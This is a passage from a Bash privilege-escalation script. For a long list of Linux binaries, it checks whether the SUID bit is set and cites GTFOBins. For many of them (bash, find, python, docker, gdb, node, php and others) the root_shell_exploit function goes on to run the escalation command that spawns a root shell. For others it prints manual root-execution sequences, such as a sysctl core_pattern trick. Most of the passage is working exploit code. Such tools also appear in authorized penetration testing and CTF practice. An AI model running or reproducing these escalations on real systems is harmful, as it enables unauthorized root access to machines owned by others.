            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'sed\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/sed/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v split)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'split\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/split/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v sysctl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'sysctl\' has its SUID bit turned on. Execute a command as root using the following sequence of commands:\nCOMMAND=\'/bin/sh -c id>/tmp/id\'\nsysctl "kernel.core_pattern=|$COMMAND"\nsleep 9999 &\nkill -QUIT $!\ncat /tmp/id\e[0m'
        fi
    fi

    binary=$(command -v tcpdump)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            commandVulnerableFound=$((commandVulnerableFound + 1))
            echo $'\n\e[35m\e[1m('"$commandVulnerableFound"$')\e[0m\e[35m Binary \'tcpdump\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/tcpdump/ for further options.\e[0m'
        fi
    fi

    if [[ $commandVulnerableFound -eq 0 ]]; then
        echo $'\n\e[35mNo command vulnerabilities found.'
    fi

}

function root_shell_exploit {
    rootVulnerableFound=0

    echo $'\n\n\e[1m\e[4m\e[31mROOT SHELL VULNERABILITIES\e[0m'

    binary=$(command -v aa-exec)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'aa-exec\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            aa-exec /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v agetty)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'agetty\' has its SUID bit turned on. Obtain a root shell by executing the following command:\nagetty -o -p -l /bin/sh -a root tty\e[0m'
        fi
    fi

    binary=$(command -v ash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'ash\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            ash -p
            exit
        fi
    fi

    binary=$(command -v bash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'bash\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            bash -p
            exit
        fi
    fi

    binary=$(command -v busybox)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'busybox\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/busybox/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v cabal)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'cabal\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/cabal/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v capsh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'capsh\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            capsh --gid=0 --uid=0 --
            exit
        fi
    fi

    binary=$(command -v choom)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'choom\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            choom -n 0 -- /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v chroot)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'chroot\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            chroot / /bin/sh -p
            exit
        fi
    fi
    
    binary=$(command -v cpulimit)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'cpulimit\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            cpulimit -l 100 -f -- /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v csh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'csh\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            csh -b
            exit
        fi
    fi

    binary=$(command -v dash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'dash\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            dash -p
            exit
        fi
    fi

    binary=$(command -v debugfs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'debugfs\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/debugfs/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v distcc)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'distcc\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            distcc /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v dmsetup)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'dmsetup\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/dmsetup/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v docker)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'docker\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            docker run -v /:/mnt --rm -it alpine chroot /mnt sh
            exit
        fi
    fi

    binary=$(command -v elvish)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'elvish\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            elvish
            exit
        fi
    fi

    binary=$(command -v emacs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'emacs\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/emacs/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v env)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'env\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            env /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v expect)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'expect\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            expect -c 'spawn /bin/sh -p;interact'
            exit
        fi
    fi

    binary=$(command -v find)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'find\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            find . -exec /bin/sh -p \; -quit
            exit
        fi
    fi

    binary=$(command -v fish)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'fish\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            fish
            exit
        fi
    fi

    binary=$(command -v flock)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'flock\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            flock -u / /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v gdb)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'gdb\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
            exit
        fi
    fi

    binary=$(command -v genie)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'genie\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/genie/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v gimp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'gimp\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/gimp/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v gtester)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'gtester\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/gtester/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v hping3)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'hping3\' has its SUID bit turned on. Obtain a root shell by executing the following command:\nhping3\n/bin/sh -p\e[0m'
            exit
        fi
    fi

    binary=$(command -v ionice)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'ionice\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            ionice /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v jjs)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'jjs\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | jjs
            exit
        fi
    fi

    binary=$(command -v jrunscript)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'jrunscript\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/jrunscript/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v ksh)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'ksh\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            ksh -p
            exit
        fi
    fi

    binary=$(command -v ld.so)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'ld.so\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            ld.so /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v logsave)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'logsave\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            logsave /dev/null /bin/sh -i -p
            exit
        fi
    fi

    binary=$(command -v msgfilter)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'msgfilter\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
            exit
        fi
    fi

    binary=$(command -v multitime)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'multitime\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            multitime /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v ncftp)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'ncftp\' has its SUID bit turned on. Obtain a root shell by executing the following command:\nncftp\n!/bin/sh -p\e[0m'
            exit
        fi
    fi

    binary=$(command -v nice)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'nice\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            nice /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v node)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'node\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
            exit
        fi
    fi

    binary=$(command -v nohup)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'nohup\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
            exit
        fi
    fi

    binary=$(command -v openvpn)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'openvpn\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
            exit
        fi
    fi

    binary=$(command -v perf)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'perf\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            perf stat /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v perl)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'perl\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/perl/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v pexec)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'pexec\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            pexec /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v php)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'php\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            php -r "pcntl_exec('/bin/sh', ['-p']);"
            exit
        fi
    fi

    binary=$(command -v python)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'python\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
            exit
        fi
    fi

    binary=$(command -v rlwrap)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'rlwrap\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            rlwrap -H /dev/null /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v rsync)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'rsync\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/rsync/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v rtorrent)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'rtorrent\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc && rtorrent
            exit
        fi
    fi

    binary=$(command -v run-parts)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'run-parts\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            run-parts --new-session --regex '^sh$' /bin --arg='-p'
            exit
        fi
    fi

    binary=$(command -v rview)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'rview\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/rview/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v rvim)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'rvim\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/rvim/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v sash)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'sash\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            sash
            exit
        fi
    fi

    binary=$(command -v scanmem)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'scanmem\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/scanmem/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v setarch)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'setarch\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            setarch $(arch) /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v setlock)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'setlock\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            setlock - /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v softlimit)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'softlimit\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            softlimit /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v ssh-agent)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'ssh-agent\' has its SUID bit turned on. Refer to https://gtfobins.github.io/gtfobins/ssh-agent/ for further options.\e[0m'
        fi
    fi

    binary=$(command -v sshpass)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'sshpass\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            sshpass /bin/sh -p
            exit
        fi
    fi

    binary=$(command -v start-stop-daemon)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
        if [[ ${usersBinaries["$base"]} || ${usersBinaries[$(basename $(readlink -f "$binary"))]} ]]; then
            rootVulnerableFound=$((rootVulnerableFound + 1))
            echo $'\n\e[31m\e[1m('"$rootVulnerableFound"$') Binary \'start-stop-daemon\' has its SUID bit turned on. Attempting to gain root shell...\n\e[0m'
            start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
            exit
        fi
    fi

    binary=$(command -v stdbuf)
    if [[ -n "$binary" ]]; then
        base=$(basename "$binary")
